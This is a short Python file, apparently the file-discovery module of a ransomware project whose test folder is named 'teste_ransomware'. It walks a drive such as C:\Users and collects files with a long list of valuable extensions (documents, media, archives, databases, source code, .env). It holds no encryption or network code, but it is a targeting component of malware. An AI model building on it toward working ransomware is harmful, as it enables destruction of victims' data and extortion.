import getpass
import os


def resolverPathWindows():
    return "\\"


def resolverUserWindows():
    return getpass.getuser()


class DiscoverFile:

    ext = [
        "mkv", "mp4", "avi", "mov", "mpeg", "wmv", "flv",   # videos
        "ppt", "pptx", "odt", "epub", "odp", "rtf", "sql", "iso", "aspx", "db", "dbf", "3gp", "ps",  # some others
        "mp3", "aac", "flac", "ape", "ogg", "wav", # musics
        "zip", "tar", "tgz", "7z", "rar", "bak",  # zip files
        "ps", "bat", "vb",  # windows files
        "jpg", "jpeg", "img", "svg",  # images
        "doc", "docx",  # word files
        "pdf",  # pdf files
        "yaml", "yml",  # docker and swagger files
        "xml", "xls", "xlsx", "xlsm",   # excel files
        "html", "js", "css", "scss", "tsx", # web script files
        "java", "cpp", "h", "c", "go",  # popular programming languages
        "bf", "py", "pyc", "coffee", "class", "jar", "txt", "md", "json",
        "log", "gitignore", "csv", "iml", "env", "idea", "mq5", "dart", "asm"
    ]

    def __init__(self, origin):
        """
        Find the path to files
        :param origin: start local [recommend C:// or C://Users]
        """
        self.__origin = origin

    @property
    def origin(self):
        return self.__origin

    def discover(self):
        """
        Explore, all dirs and subdirs, from path in origin
        :return:
        """
        for dirpath, dirs, files in os.walk(self.origin):   # os walk -> dir, subdir, file
            for file in files:
                abs_path = os.path.abspath(os.path.join(dirpath, file))
                ext = abs_path.split('.')[-1]
                if ext in self.ext:
                    yield abs_path


if __name__ == '__main__':
    files = DiscoverFile(f"C:{resolverPathWindows()}teste_ransomware")
    for i in files.discover():
        print(i)
